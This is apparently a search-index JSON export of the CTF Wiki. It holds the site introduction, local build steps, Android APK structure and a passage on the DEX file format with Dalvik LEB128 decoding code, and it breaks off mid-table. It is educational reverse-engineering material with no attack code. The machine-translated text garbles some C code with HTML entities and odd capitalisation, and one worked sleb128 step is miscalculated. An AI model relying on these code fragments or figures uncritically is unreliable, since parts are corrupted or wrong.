{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to the CTF Wiki . CTF (Capture The Flag) is originated in the 1996 DEFCON Global Hacking Conference, a competitive game among cybersecurity enthusiasts. The CTF competition covers a wide range of fields and has a complex content. At the same time, the development of security technology is getting faster and faster, and the difficulty of CTF is getting higher and higher, the threshold for beginners is getting higher and higher. Most of the online information is scattered and trivial. Beginners often don't know how to systematically learn the knowledge of CTF related fields, often taking a lot of time and suffering. In order to make the CTF players life of entering this field easier, in October 2016, CTF Wiki had the first commit on Github. As content continues to improve, the CTF Wiki has been loved by more and more security enthusiasts, and there are also a lot of friends who have never met participating in this project. As a free site, with the recent years' CTF challenges, CTF Wiki introduces the knowledge and techniques in all directions of CTF to make it easier for beginners to learn how to getting started at playing CTF . At present, CTF Wiki mainly contains the basic knowledge of CTF in all major directions, and is working hard to improve the following contents. Advanced knowledge in the CTF competition Quality topics in the CTF competition For more information on the above, see the [Projects] ( https://github.com/ctf-wiki/ctf-wiki/projects ) of the CTF Wiki for a detailed list of what is being done and what to do. Of course, the CTF Wiki is based on CTF , but it is not limited to CTF . In the future, CTF Wiki will Introducing tools in security research area More integration with security area In addition, given the following two points Technology should be shared in an open manner. Security offensive and defensive technologies are always up to date, and old technologies may fail at any time in the face of new technologies. CTF Wiki will never publish books. Finally, the CTF Wiki originates from the community, as an independent organization , advocates freedom of knowledge , will never be commercialized in the future, and will always remain independent and freedom**. How to build\uff1f \u00b6 This document is currently deployed at [ https://ctf-wiki.github.io/ctf-wiki/ ] ( https://ctf-wiki.github ) using mkdocs .io/ctf-wiki/). Of course, it can also be deployed locally, as follows: # 1. clone git clone git@github.com: ctf-wiki / ctf-wiki.git # 2. requirements pip install -r requirements.txt # generate static file in site/ mkdocs build # deploy at http://127.0.0.1:8000 mkdocs serve mkdocs Locally deployed websites are dynamically updated, i.e. when you modify and save the md file, refreshing the page and the contents will be dynamically updated. Just want to browse locally, don't want to modify the document? Try Docker! docker run -d --name=ctf-wiki -p 4100:80 ctfwiki/ctf-wiki You can then access the CTF Wiki by visiting [ http://localhost:4100/ ] ( http://localhost:4100/ ) in your browser. How to practice\uff1f \u00b6 First, you can learn some basic security knowledge by reading online. Second, the CTF Wiki has two accompany projects. The challenges mentioned in the CTF Wiki are in the [ctf-challenges] ( https://github.com/ctf-wiki/ctf-challenges ) repository, so look for them according to the corresponding category. Note: There are still some challenges that are currently being migrated. . . (misc, web) The tools involved in the CTF Wiki are constantly being added to the ctf-tools repository.","title":"Getting Started"},{"location":"#how-to-build","text":"This document is currently deployed at [ https://ctf-wiki.github.io/ctf-wiki/ ] ( https://ctf-wiki.github ) using mkdocs .io/ctf-wiki/). Of course, it can also be deployed locally, as follows: # 1. clone git clone git@github.com: ctf-wiki / ctf-wiki.git # 2. requirements pip install -r requirements.txt # generate static file in site/ mkdocs build # deploy at http://127.0.0.1:8000 mkdocs serve mkdocs Locally deployed websites are dynamically updated, i.e. when you modify and save the md file, refreshing the page and the contents will be dynamically updated. Just want to browse locally, don't want to modify the document? Try Docker! docker run -d --name=ctf-wiki -p 4100:80 ctfwiki/ctf-wiki You can then access the CTF Wiki by visiting [ http://localhost:4100/ ] ( http://localhost:4100/ ) in your browser.","title":"How to build\uff1f"},{"location":"#how-to-practice","text":"First, you can learn some basic security knowledge by reading online. Second, the CTF Wiki has two accompany projects. The challenges mentioned in the CTF Wiki are in the [ctf-challenges] ( https://github.com/ctf-wiki/ctf-challenges ) repository, so look for them according to the corresponding category. Note: There are still some challenges that are currently being migrated. . . (misc, web) The tools involved in the CTF Wiki are constantly being added to the ctf-tools repository.","title":"How to practice\uff1f"},{"location":"android/readme/","text":"Android Security \u00b6","title":"Android Security"},{"location":"android/readme/#android-security","text":"","title":"Android Security"},{"location":"android/basic_develop/basic_develop/","text":"Android Development Fundamentals \u00b6 Before doing Android security, we should understand the basic process of Android development as much as possible. Basic knowledge \u00b6 Read the following books in order to learn about Android basic development knowledge from the shallower The first line of code, after reading the first seven chapters JNI/NDK development, there is currently no suitable guide available. The authoritative guide to Android programming (optional) Android Advanced Advanced (optional) In the process of learning, I feel that I need to focus on the following knowledge in Android development. Android system architecture Basic source file architecture Basic development methods and code writing conventions to understand the meaning of common code. Understand the file format of some configuration resources such as xml. Be sure to set up a basic Android development environment! ! ! ! ! java ddms ndk sdk, install several versions of sdk, 5.0-8.0 Apk Packaging Process \u00b6 After writing the App-related code, our final step is to package all the resource files used in the App. The packaging process is as shown in the following figure ( http://androidsrc.net/android-app-build-overview/ ). : The specific operation is as follows Use aapt ( The Android Asset Packing Tool ) to package the resource files to generate R.java files. If the service provided by AIDL (Android Interface Definition Language) is used in the project, you need to use the AIDL tool to parse the AIDL interface file to generate the corresponding Java code. Compile the R.java and AIDL files into a .class file using javac. Use the dx tool to convert class and third-party libraries to dex files. Use apkbuilder to package the first compiled resource, the .dex file generated in step 4, and some other resources into the APK file. This section mainly signs the APK. There are two cases. If we want to publish the app, we will use the RealeaseKeystore signature. Otherwise, if we just want to debug the app, we will use the debug.keystore signature. Before releasing the official version, we need to change the starting offset of the resource file in the APK package from the file to an integer multiple of 4 bytes, so that the speed will be faster when the App is run later. Apk file structure \u00b6 The APK file is also a ZIP file. Therefore, we can decompress it using the tool that unpacks the zip. The structure of a typical APK file is shown below. Among them, the introduction of each part is as follows AndroidManifest.xml This file is mainly used to declare basic information such as the name, components, permissions of the application. class.dex This file is the executable file for the dalvik virtual machine and contains the executable code of the application. resource.arsc This file is mainly a binary resource compiled by the application and a mapping relationship between the resource location and the resource id, such as a string. assets This folder is typically used for the original resource files that contain the application, such as fonts and music files. This information can be obtained through the API while the program is running. lib/ The lib directory is mainly used to store local library files used by the JNI (Java Native Interface) mechanism, and the corresponding subdirectories are created according to the supported architecture. res / This directory mainly contains resources referenced by Android apps, and will be stored according to resource types, such as images, animations, menus, etc. There is also a value folder that contains various attribute resources. colors.xml-->color resources dimens.xml--->size resources strings--->string resources styles.xml-->style resources META-INF / Similar to JAR files, the APK file also contains the META-INF directory, which is used to store files such as code signatures, so that it can be used to ensure that APK files are not modified at will.","title":"Android Development Basics"},{"location":"android/basic_develop/basic_develop/#android-development-fundamentals","text":"Before doing Android security, we should understand the basic process of Android development as much as possible.","title":"Android Development Fundamentals"},{"location":"android/basic_develop/basic_develop/#basic-knowledge","text":"Read the following books in order to learn about Android basic development knowledge from the shallower The first line of code, after reading the first seven chapters JNI/NDK development, there is currently no suitable guide available. The authoritative guide to Android programming (optional) Android Advanced Advanced (optional) In the process of learning, I feel that I need to focus on the following knowledge in Android development. Android system architecture Basic source file architecture Basic development methods and code writing conventions to understand the meaning of common code. Understand the file format of some configuration resources such as xml. Be sure to set up a basic Android development environment! ! ! ! ! java ddms ndk sdk, install several versions of sdk, 5.0-8.0","title":"Basic knowledge"},{"location":"android/basic_develop/basic_develop/#apk-packaging-process","text":"After writing the App-related code, our final step is to package all the resource files used in the App. The packaging process is as shown in the following figure ( http://androidsrc.net/android-app-build-overview/ ). : The specific operation is as follows Use aapt ( The Android Asset Packing Tool ) to package the resource files to generate R.java files. If the service provided by AIDL (Android Interface Definition Language) is used in the project, you need to use the AIDL tool to parse the AIDL interface file to generate the corresponding Java code. Compile the R.java and AIDL files into a .class file using javac. Use the dx tool to convert class and third-party libraries to dex files. Use apkbuilder to package the first compiled resource, the .dex file generated in step 4, and some other resources into the APK file. This section mainly signs the APK. There are two cases. If we want to publish the app, we will use the RealeaseKeystore signature. Otherwise, if we just want to debug the app, we will use the debug.keystore signature. Before releasing the official version, we need to change the starting offset of the resource file in the APK package from the file to an integer multiple of 4 bytes, so that the speed will be faster when the App is run later.","title":"Apk Packaging Process"},{"location":"android/basic_develop/basic_develop/#apk-file-structure","text":"The APK file is also a ZIP file. Therefore, we can decompress it using the tool that unpacks the zip. The structure of a typical APK file is shown below. Among them, the introduction of each part is as follows AndroidManifest.xml This file is mainly used to declare basic information such as the name, components, permissions of the application. class.dex This file is the executable file for the dalvik virtual machine and contains the executable code of the application. resource.arsc This file is mainly a binary resource compiled by the application and a mapping relationship between the resource location and the resource id, such as a string. assets This folder is typically used for the original resource files that contain the application, such as fonts and music files. This information can be obtained through the API while the program is running. lib/ The lib directory is mainly used to store local library files used by the JNI (Java Native Interface) mechanism, and the corresponding subdirectories are created according to the supported architecture. res / This directory mainly contains resources referenced by Android apps, and will be stored according to resource types, such as images, animations, menus, etc. There is also a value folder that contains various attribute resources. colors.xml-->color resources dimens.xml--->size resources strings--->string resources styles.xml-->style resources META-INF / Similar to JAR files, the APK file also contains the META-INF directory, which is used to store files such as code signatures, so that it can be used to ensure that APK files are not modified at will.","title":"Apk file structure"},{"location":"android/basic_operating_mechanism/readme/","text":"Android application operation mechanism \u00b6 This section focuses on the basic operating principles of Java layer code and Native layer code in Android. In general, when launching an app, Android first executes the creation of the Application class (specified in the AndroidManifest.xml file), then starts executing the Main Activity, and then executes the relevant code according to various logics. Note: The contents of this section may have the following problems Brief I don\u2019t understand If you find something you can add, feel free to add it at any time. Of course, this section will also be updated over time.","title":"Basics"},{"location":"android/basic_operating_mechanism/readme/#android-application-operation-mechanism","text":"This section focuses on the basic operating principles of Java layer code and Native layer code in Android. In general, when launching an app, Android first executes the creation of the Application class (specified in the AndroidManifest.xml file), then starts executing the Main Activity, and then executes the relevant code according to various logics. Note: The contents of this section may have the following problems Brief I don\u2019t understand If you find something you can add, feel free to add it at any time. Of course, this section will also be updated over time.","title":"Android application operation mechanism"},{"location":"android/basic_operating_mechanism/java_layer/readme/","text":"Android Java layer running mechanism \u00b6 This section focuses on the operating mechanism of Java layer code in Android. Java virtual machine, from a macro perspective, the program execution flow to consider how Java code is executed. Smali code that considers how Java code corresponds to instructions in the J Java virtual machine from a microscopic perspective, the instruction level. Java layer executable, considering the specific format of the corresponding executable file of the Java virtual machine.","title":"Andriod Native"},{"location":"android/basic_operating_mechanism/java_layer/readme/#android-java-layer-running-mechanism","text":"This section focuses on the operating mechanism of Java layer code in Android. Java virtual machine, from a macro perspective, the program execution flow to consider how Java code is executed. Smali code that considers how Java code corresponds to instructions in the J Java virtual machine from a microscopic perspective, the instruction level. Java layer executable, considering the specific format of the corresponding executable file of the Java virtual machine.","title":"Android Java layer running mechanism"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/","text":"DEX file \u00b6 basic introduction \u00b6 Google has designed the corresponding executable file DEX (Dalvik eXecutable File) for Java code in Android, which is suitable for mobile platforms such as mobile phones with low memory and poor processor performance. Below, we will mainly introduce the format of the DEX file. DEX file format \u00b6 Data type definition \u00b6 Before we introduce the specific structure of the DEX file, let's take a look at some of the basic data types used in the DEX file. Name Description byte 8-bit signed integer ubyte 8-bit unsigned integer short 16-bit signed integer in little endian ushort 16-bit unsigned integer in little endian int 32-bit signed integer in little endian uint 32-bit unsigned integer in little endian Long 64-bit signed integer in little endian ulong 64-bit unsigned integer in little endian sleb128 Signed LEB128, variable length (see below) uleb128 Unsigned LEB128, variable length (see below) uleb128p1 Unsigned LEB128 plus 1 , variable length (see below) The reason why the variable length data type is used is because you want to minimize the footprint of the executable file. For example, if the length of a string is 5, then we only need one byte, but we don't I would like to use u1 directly to define the corresponding type, as this will limit all string lengths to the corresponding range. Variable-length types are actually based on the LEB128 (Little-Endian Base) type and can be used to represent 32-bit int numbers, which are chosen according to the size of the number to be represented. As shown in the figure below, the highest bit of each byte indicates whether the next byte is used, 1 means use, 0 means not used. Therefore, each byte actually has only 7 valid bits to indicate the corresponding number. If there is a variable of type LEB128 that uses 5 bytes and the highest bit of the fifth byte is 1, then there is a problem. The function of reading unsigned leb128 type in dalvik is as follows DEX_INLINE int readUnsignedLeb128 ( const u1 ** pStream ) { const u1 * ptr = * pStream ; Int result = * ( ptr ++ ); //take the first byte If ( result & gt ; 0x7f ) { //If the first byte is greater than 0x7f, the highest byte of the first byte is 1 Int cur = * ( ptr ++ ); //2nd byte Result = ( result & amp ; 0x7f ) | (( cur & amp ; 0x7f ) & lt ; & lt ; 7 ); //The first two bytes if ( cur > 0x7f ) { cur = * ( ptr ++ ); result |= ( cur & 0x7f ) << 14 ; if ( cur > 0x7f ) { cur = * ( ptr ++ ); result |= ( cur & 0x7f ) << 21 ; if ( cur > 0x7f ) { /* * Note: We don't check to see if cur is out of * range here, meaning we tolerate garbage in the * high four-order bits. */ cur = * ( ptr ++ ); result |= cur << 28 ; } } } } * pStream = ptr ; return result ; } For example, if we want to calculate the uleb128 value of c0 83 92 25, as follows The highest bit of the first byte is 1, so there is a second byte. Result1 = 0xc0 & 0x7f=0x40 Similarly, the second byte corresponds to result2 = (0x83 & 0x7f)<<7 = 0x180 The result of the third byte is result3 = (0x92 & 0x7f) <<14 = 0x48000 result4 of the fourth byte = (0x25)<<21 = 0x4a00000 The value corresponding to this byte stream is result1+result2+result3+result4 = 0x4a481c0 The number of signed LEB128 types in dalvik is as follows DEX_INLINE int readSignedLeb128 ( const u1 ** pStream ) { const u1 * ptr = * pStream ; int result = * ( ptr ++ ); if ( result <= 0x7f ) { Result = ( result & lt ; & lt ; 25 ) & gt ; & gt ; 25 ; //symbol expansion } else { int cur = * ( ptr ++ ); result = ( result & 0x7f ) | (( cur & 0x7f ) << 7 ); if ( cur <= 0x7f ) { Result = ( result & lt ; & lt ; 18 ) & gt ; & gt ; 18 ; //symbol expansion } else { cur = * ( ptr ++ ); Result |= ( cur & amp ; 0x7f ) & lt ; & lt ; 14 ; //symbol expansion if ( cur <= 0x7f ) { Result = ( result & lt ; & lt ; 11 ) & gt ; & gt ; 11 ; //symbol expansion } else { cur = * ( ptr ++ ); result |= ( cur & 0x7f ) << 21 ; if ( cur <= 0x7f ) { Result = ( result & lt ; & lt ; 4 ) & gt ; & gt ; 4 ; //symbol expansion } else { /* * Note: We don't check to see if cur is out of * range here, meaning we tolerate garbage in the * high four-order bits. */ cur = * ( ptr ++ ); result |= cur << 28 ; } } } } * pStream = ptr ; return result ; } For example, if we want to calculate the sleb128 value of d1 c2 b3 40, the calculation process is as follows result1 = 0xd1 & 0x7f = 0x51 result2 = (0xc2 & 0x7f) <<7 = 0x21000 result3 = (0xb3 & 0x7f) <<14 =0xcc000 result4 = (0x40)<< 21 = 0x8000000 The final result (r1+r2+r3+r4)<< 4 >>4 = 0xf80ce151 The uleb128p1 type is mainly used to represent unsigned numbers, which is suitable for the following scenarios. Requires the representation of the number to be non-negative When the number is 0xffffffff, it is 0 by adding 1 to it. At this time, we only need 1 byte. Need to think further. DEX File Overview \u00b6 The overall structure of the DEX file is as follows Mainly consists of three parts The file header gives the basic properties of the dex file. The index area, which gives an index of the relevant data, whose data is actually placed in the data area. Data area, storing the actual string, code. DEX file header \u00b6 The file header of DEX mainly contains magic field, alder32 check value, SHA-1 hash value, number of string_ids and offset address, etc., which occupy 0x70 bytes, and the data structure is as follows: struct DexHeader { u1 magic [ 8 ]; /* includes version number */ u4 checksum ; /* adler32 checksum */ u1 signature [ kSHA1DigestLen ]; / * SHA -1 hash * / u4 fileSize ; /* length of entire file */ u4 headerSize ; /* offset to start of next section */ U4 endianTag ; u4 linkSize ; u4 linkOff ; u4 mapOff ; u4 stringIdsSize ; u4 stringIdsOff ; u4 typeIdsSize ; u4 typeIdsOff ; u4 protoIdsSize ; u4 protoIdsOff ; u4 fieldIdsSize ; u4 fieldIdsOff ; u4 methodIdsSize ; u4 methodIdsOff ; u4 classDefsSize ; u4 classDefsOff ; u4 dataSize ; u4 dataOff ; }; The specific description is as follows Name Format Description Magic ubyte[8] = DEX_FILE_MAGIC Identifies the DEX file, where DEX_FILE_MAGIC =\"dex\\n035\\0\" Checksum uint The adler32 checksum of the rest of the files except magic and this field, used to detect file corruption signature ubyte[20] SHA-1 signature (hash) for the contents of files other than magic , checksum and this field, used to uniquely identify the file file_size uint The size of the entire file (including the file header) in bytes header_size uint = 0x70 The size of the file header, in bytes. Endian_tag uint = ENDIAN_CONSTANT Byte order mark, big endian or little endian. link_size uint If this file is not statically linked, the value is 0 , otherwise the size of the link section, link_off uint If link_size == 0 , the value is 0 ; otherwise, the offset is the offset from the beginning of the file to the link_data section. map_off uint The offset must be non-zero, identifying the offset from the beginning of the file to the data section. string_ids_size uint Number of strings in the list of string identifiers string_ids_off uint If string_ids_size == 0 (which is undeniably a strange extreme case), the value is 0 ; otherwise it represents the offset from the beginning of the file to string_ids . type_ids_size uint The number of elements in the type identifier list, up to 65535 type_ids_off uint If type_ids_size == 0 (which is undeniably a strange extreme case), the value is 0 ; otherwise it represents the offset from the beginning of the file to the beginning of the type_ids section. proto_ids_size uint Prototype (method) The number of elements in the list of identifiers, up to 65535 proto_ids_off uint If proto_ids_size == 0 (which is undeniably a strange extreme case), the value is 0 ; otherwise the offset represents the offset from the beginning of the file to the beginning of the proto_ids section the amount. field_ids_size uint Number of Elements in the Field Identifier List field_ids_off uint If field_ids_size == 0 , the value is 0 ; otherwise the offset represents the offset from the beginning of the file to the beginning of the field_ids section. method_ids_size uint Number of elements in the method identifier list method_ids_off uint If method_ids_size == 0 , the value is 0 . The offset, on the other hand, represents the offset from the beginning of the file to the beginning of the method_ids section. class_defs_size uint Number of elements in the class definition list class_defs_off uint If class_defs_size == 0 (which is undeniably a strange extreme case), the value is 0 ; otherwise the offset represents the offset from the beginning of the file to the beginning of the class_defs section the amount. data_size uint The size of the data section in bytes, which must be an even multiple of sizeof(uint), indicating 8-byte alignment. data_off uint The offset from the beginning of the file to the beginning of the data section. DEX index area \u00b6 string id \u00b6 The StringIds section contains the stringIdsSize DexStringId structure, which has the following structure: struct DexStringId { U4 stringDataOff ; /* String data offset, which is the file offset of each StringData in the data area */ }; It can be seen that only the relative offset of each string is stored in DexStringId. In addition, each offset occupies 4 bytes, and the string portion occupies 4*stringIdsSize bytes in total. At the corresponding offset, the string is stored in the MUTF-8 format, which stores the variable of the LEB128 type we mentioned earlier, indicating the length of the string, followed by the string, followed by End of x00, the length of the string does not contain \\x00. type id \u00b6 The type_ids section indexes all the types (classes, arrays, or primitive types) used in the java code. This list must be sorted by the string_id index and cannot be repeated. struct DexTypeId { U4 descriptorIdx ; /* index to the list of DexStringIds*/ }; proto Id \u00b6 The Proto id field is mainly designed for the method prototype in java. It mainly contains the return type and parameter list of a method declaration, which is not involved in the method name. It mainly contains the following three data structures struct DexProtoId { U4 shortyIdx ; /* return type + parameter type, shorthand, index to the list of DexStringId */ U4 returnTypeIdx ; /* return type, index to the DexTypeId list */ U4 parametersOff ; /* parameter type, offset to DexTypeList*/ } struct DexTypeList { U4 size ; /* The number of DexTypeItems, that is, the number of parameters */ DexTypeItem list [ 1 ]; /* points to the beginning of the DexTypeItem*/ }; struct DexTypeItem { U2 typeIdx ; /* parameter type, index to the list of DexTypeId, and finally point to the string index */ }; field id \u00b6 The field id area is mainly designed for the fields of each class in java, mainly related to the following data structure. struct DexFieldId { U2 classIdx ; /* The type of the class, pointing to the index of the DexTypeId list */ U2 typeIdx ; /* field type, index to the list of DexTypeIds*/ U4 nameIdx ; /* field name, index to the DexStringId list */ }; method id \u00b6 The method id area is designed directly for methods in java. It contains the class in which the method resides, the prototype of the method, and the name of the method. struct DexMethodId { U2 classIdx ; /* The type of the class, pointing to the index of the DexTypeId list */ U2 protoIdx ; /* declaration type, index to the DexProtoId list */ U4 nameIdx ; /* method name, index to the DexStringId list */ }; class def \u00b6 classDefsSize indicates the size of the class def area, and classDefsOff indicates the offset of the class def area. This area is designed for classes in java and contains the following data structures. The related information is as follows // basic information about the class struct DexClassDef { U4 classIdx ; /* The type of the class, pointing to the index of the DexTypeId list */ U4 accessFlags ; /* access flag*/ U4 superclassIdx ; /* parent class type, index to the DexTypeId list */ U4 interfacesOff ; /* interface, offset to DexTypeList*/ U4 sourceFileIdx ; /* source file name, index to the DexStringId list */ U4 annotationsOff ; /* annotation, pointing to the DexAnnotationsDirectoryItem structure */ U4 classDataOff ; /* points to the offset of the DexClassData structure */ U4 staticValuesOff ; /* points to the offset of the DexEncodedArray structure */ }; // Overview of the fields and methods of the class struct DexClassData { DexClassDataHeader header ; /* Specify the number of fields and methods */ DexField * staticFields ; /* static field, DexField structure */ DexField * instanceFields ; /* instance field, DexField structure */ DexMethod * directMethods ; /* Direct method, DexMethod structure */ DexMethod * virtualMethods ; /* virtual method, DexMethod structure */ / / Detailed description of the number of fields and the number of methods struct DexClassDataHeader { U4 staticFieldsSize ; /* number of static fields */ U4 instanceFieldsSize ; /* number of instance fields */ U4 directMethodsSize ; /* number of direct methods */ U4 virtualMethodsSize ; /* number of virtual methods */ }; // field definition struct DexField { U4 fieldIdx ; /* index to DexFieldId*/ U4 accessFlags ; /* access flag*/ }; // method definition struct DexMethod { U4 methodIdx ; /* index to DexMethodId*/ U4 accessFlags ; /* access flag*/ U4 codeOff ; /* points to the offset of the DexCode structure */ }; // Code overview struct DexCode { U2 registersSize ; /* Number of registers used */ U2 insSize ; /* number of parameters */ U2 outsSize ; /* The number of registers used by other methods when calling other methods will be applied in their own call stack and pushed (guessed) */ U2 triesSize ; /* Try/Catch number*/ U4 debugInfoOff ; /* points to the offset of the debug information */ U4 insnsSize ; /* The number of instruction sets, in units of 2 bytes */ U2 insns [ 1 ]; /* instruction set*/ }; Summary \u00b6 It can be seen that pointing in the index area is more complicated, but at the same time it is also clever. Here is the Dalvik designer in the [Google Developer Day 2008 China] ( https://sites.google.com/site/developerdaychina/ ) speech. Give an example. DEX Data Area \u00b6 What is stored here is the various data mentioned before. DEX map section \u00b6 The mapOff field in DexHeader gives the offset of the DexMapList structure in the DEX file. When the Dalvik virtual machine parses the content of the DEX file, it maps the content to the DexMapList data structure. It can be said that the structure describes the overall profile of the corresponding DEX file. The specific code is as follows struct DexMapList { U4 size ; /* The number of DexMapItem, easy to parse */ DexMapItem list [ 1 ]; /* points to DexMapItem */ }; struct DexMapItem { U2 type ; /* Type at the beginning of kDexType*/ U2 unused ; /* not used for byte alignment*/ U4 size ; /* specifies the number of corresponding types */ U4 offset ; /* specifies the file offset of the corresponding type of data */ }; The /* type field is an enumeration constant, and it is easy to determine its specific type by type name. */ /* map item type codes */ enum { kDexTypeHeaderItem = 0x0000 , kDexTypeStringIdItem = 0x0001 , kDexTypeTypeIdItem = 0x0002 , kDexTypeProtoIdItem = 0x0003 , kDexTypeFieldIdItem = 0x0004 , kDexTypeMethodIdItem = 0x0005 , kDexTypeClassDefItem = 0x0006 , kDexTypeMapList = 0x1000 , kDexTypeTypeList = 0x1001 , kDexTypeAnnotationSetRefList = 0x1002 , kDexTypeAnnotationSetItem = 0x1003 , kDexTypeClassDataItem = 0x2000 , kDexTypeCodeItem = 0x2001 , kDexTypeStringDataItem = 0x2002 , kDexTypeDebugInfoItem = 0x2003 , kDexTypeAnnotationItem = 0x2004 , kDexTypeEncodedArrayItem = 0x2005 , kDexTypeAnnotationsDirectoryItem = 0x2006 , }; DEX instance \u00b6 Specifically, you can find an apk yourself, and then you can see the corresponding result by parsing the template of 010editor. Reference reading \u00b6 Android software security and reverse analysis","title":"DEX"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex-file","text":"","title":"DEX file"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#basic-introduction","text":"Google has designed the corresponding executable file DEX (Dalvik eXecutable File) for Java code in Android, which is suitable for mobile platforms such as mobile phones with low memory and poor processor performance. Below, we will mainly introduce the format of the DEX file.","title":"basic introduction"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex-file-format","text":"","title":"DEX file format"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#data-type-definition","text":"Before we introduce the specific structure of the DEX file, let's take a look at some of the basic data types used in the DEX file. Name Description byte 8-bit signed integer ubyte 8-bit unsigned integer short 16-bit signed integer in little endian ushort 16-bit unsigned integer in little endian int 32-bit signed integer in little endian uint 32-bit unsigned integer in little endian Long 64-bit signed integer in little endian ulong 64-bit unsigned integer in little endian sleb128 Signed LEB128, variable length (see below) uleb128 Unsigned LEB128, variable length (see below) uleb128p1 Unsigned LEB128 plus 1 , variable length (see below) The reason why the variable length data type is used is because you want to minimize the footprint of the executable file. For example, if the length of a string is 5, then we only need one byte, but we don't I would like to use u1 directly to define the corresponding type, as this will limit all string lengths to the corresponding range. Variable-length types are actually based on the LEB128 (Little-Endian Base) type and can be used to represent 32-bit int numbers, which are chosen according to the size of the number to be represented. As shown in the figure below, the highest bit of each byte indicates whether the next byte is used, 1 means use, 0 means not used. Therefore, each byte actually has only 7 valid bits to indicate the corresponding number. If there is a variable of type LEB128 that uses 5 bytes and the highest bit of the fifth byte is 1, then there is a problem. The function of reading unsigned leb128 type in dalvik is as follows DEX_INLINE int readUnsignedLeb128 ( const u1 ** pStream ) { const u1 * ptr = * pStream ; Int result = * ( ptr ++ ); //take the first byte If ( result & gt ; 0x7f ) { //If the first byte is greater than 0x7f, the highest byte of the first byte is 1 Int cur = * ( ptr ++ ); //2nd byte Result = ( result & amp ; 0x7f ) | (( cur & amp ; 0x7f ) & lt ; & lt ; 7 ); //The first two bytes if ( cur > 0x7f ) { cur = * ( ptr ++ ); result |= ( cur & 0x7f ) << 14 ; if ( cur > 0x7f ) { cur = * ( ptr ++ ); result |= ( cur & 0x7f ) << 21 ; if ( cur > 0x7f ) { /* * Note: We don't check to see if cur is out of * range here, meaning we tolerate garbage in the * high four-order bits. */ cur = * ( ptr ++ ); result |= cur << 28 ; } } } } * pStream = ptr ; return result ; } For example, if we want to calculate the uleb128 value of c0 83 92 25, as follows The highest bit of the first byte is 1, so there is a second byte. Result1 = 0xc0 & 0x7f=0x40 Similarly, the second byte corresponds to result2 = (0x83 & 0x7f)<<7 = 0x180 The result of the third byte is result3 = (0x92 & 0x7f) <<14 = 0x48000 result4 of the fourth byte = (0x25)<<21 = 0x4a00000 The value corresponding to this byte stream is result1+result2+result3+result4 = 0x4a481c0 The number of signed LEB128 types in dalvik is as follows DEX_INLINE int readSignedLeb128 ( const u1 ** pStream ) { const u1 * ptr = * pStream ; int result = * ( ptr ++ ); if ( result <= 0x7f ) { Result = ( result & lt ; & lt ; 25 ) & gt ; & gt ; 25 ; //symbol expansion } else { int cur = * ( ptr ++ ); result = ( result & 0x7f ) | (( cur & 0x7f ) << 7 ); if ( cur <= 0x7f ) { Result = ( result & lt ; & lt ; 18 ) & gt ; & gt ; 18 ; //symbol expansion } else { cur = * ( ptr ++ ); Result |= ( cur & amp ; 0x7f ) & lt ; & lt ; 14 ; //symbol expansion if ( cur <= 0x7f ) { Result = ( result & lt ; & lt ; 11 ) & gt ; & gt ; 11 ; //symbol expansion } else { cur = * ( ptr ++ ); result |= ( cur & 0x7f ) << 21 ; if ( cur <= 0x7f ) { Result = ( result & lt ; & lt ; 4 ) & gt ; & gt ; 4 ; //symbol expansion } else { /* * Note: We don't check to see if cur is out of * range here, meaning we tolerate garbage in the * high four-order bits. */ cur = * ( ptr ++ ); result |= cur << 28 ; } } } } * pStream = ptr ; return result ; } For example, if we want to calculate the sleb128 value of d1 c2 b3 40, the calculation process is as follows result1 = 0xd1 & 0x7f = 0x51 result2 = (0xc2 & 0x7f) <<7 = 0x21000 result3 = (0xb3 & 0x7f) <<14 =0xcc000 result4 = (0x40)<< 21 = 0x8000000 The final result (r1+r2+r3+r4)<< 4 >>4 = 0xf80ce151 The uleb128p1 type is mainly used to represent unsigned numbers, which is suitable for the following scenarios. Requires the representation of the number to be non-negative When the number is 0xffffffff, it is 0 by adding 1 to it. At this time, we only need 1 byte. Need to think further.","title":"Data type definition"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex-file-overview","text":"The overall structure of the DEX file is as follows Mainly consists of three parts The file header gives the basic properties of the dex file. The index area, which gives an index of the relevant data, whose data is actually placed in the data area. Data area, storing the actual string, code.","title":"DEX File Overview"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex-file-header","text":"The file header of DEX mainly contains magic field, alder32 check value, SHA-1 hash value, number of string_ids and offset address, etc., which occupy 0x70 bytes, and the data structure is as follows: struct DexHeader { u1 magic [ 8 ]; /* includes version number */ u4 checksum ; /* adler32 checksum */ u1 signature [ kSHA1DigestLen ]; / * SHA -1 hash * / u4 fileSize ; /* length of entire file */ u4 headerSize ; /* offset to start of next section */ U4 endianTag ; u4 linkSize ; u4 linkOff ; u4 mapOff ; u4 stringIdsSize ; u4 stringIdsOff ; u4 typeIdsSize ; u4 typeIdsOff ; u4 protoIdsSize ; u4 protoIdsOff ; u4 fieldIdsSize ; u4 fieldIdsOff ; u4 methodIdsSize ; u4 methodIdsOff ; u4 classDefsSize ; u4 classDefsOff ; u4 dataSize ; u4 dataOff ; }; The specific description is as follows Name Format Description Magic ubyte[8] = DEX_FILE_MAGIC Identifies the DEX file, where DEX_FILE_MAGIC =\"dex\\n035\\0\" Checksum uint The adler32 checksum of the rest of the files except magic and this field, used to detect file corruption signature ubyte[20] SHA-1 signature (hash) for the contents of files other than magic , checksum and this field, used to uniquely identify the file file_size uint The size of the entire file (including the file header) in bytes header_size uint = 0x70 The size of the file header, in bytes. Endian_tag uint = ENDIAN_CONSTANT Byte order mark, big endian or little endian. link_size uint If this file is not statically linked, the value is 0 , otherwise the size of the link section, link_off uint If link_size == 0 , the value is 0 ; otherwise, the offset is the offset from the beginning of the file to the link_data section. map_off uint The offset must be non-zero, identifying the offset from the beginning of the file to the data section. string_ids_size uint Number of strings in the list of string identifiers string_ids_off uint If string_ids_size == 0 (which is undeniably a strange extreme case), the value is 0 ; otherwise it represents the offset from the beginning of the file to string_ids . type_ids_size uint The number of elements in the type identifier list, up to 65535 type_ids_off uint If type_ids_size == 0 (which is undeniably a strange extreme case), the value is 0 ; otherwise it represents the offset from the beginning of the file to the beginning of the type_ids section. proto_ids_size uint Prototype 